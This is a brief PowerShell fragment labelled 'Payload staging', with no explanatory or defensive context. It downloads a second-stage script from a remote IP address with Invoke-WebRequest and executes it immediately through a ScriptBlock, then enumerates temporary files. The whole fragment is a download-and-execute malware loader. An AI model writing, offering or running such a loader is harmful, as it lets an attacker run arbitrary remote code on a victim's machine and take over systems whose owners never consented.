
<# Payload staging #> $Stage2Url = 'https://198.51.100.200/stage2.ps1'; $RemoteScript = (iwr $Stage2Url -UseBasicParsing).Content; [ScriptBlock]::Create($RemoteScript).Invoke(); $StageMarker = "stage-29"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
